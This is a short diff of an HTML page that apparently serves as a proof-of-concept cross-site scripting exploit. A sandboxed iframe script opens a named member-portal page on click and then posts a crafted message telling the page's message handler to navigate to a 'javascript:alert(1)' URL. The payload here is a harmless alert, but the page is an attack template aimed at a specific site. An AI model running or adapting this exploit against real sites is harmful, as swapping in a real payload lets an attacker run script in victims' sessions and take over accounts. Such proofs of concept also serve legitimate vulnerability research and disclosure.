@@ -25,7 +25,7 @@
         &lt;/script>
     "></iframe> -->
 
-    <iframe sandbox="allow-scripts allow-popups" srcdoc='&lt;script>function r(){var j = window.open("//member-env3.opers.org/member/home"); setTimeout(()=>{j.postMessage("asdf", "*")}, 2000)};window.onclick=r&lt;/script>Click Me'></iframe>
+    <iframe sandbox="allow-scripts allow-popups" srcdoc='&lt;script>function r(){var j = window.open("//member-env3.opers.org/member/home"); setTimeout(()=>{j.postMessage(JSON.stringify({action: "href",url: "javascript:alert(1)"}), "*")}, 2000)};window.onclick=r&lt;/script>Click Me'></iframe>
 
 </body>
 </html>
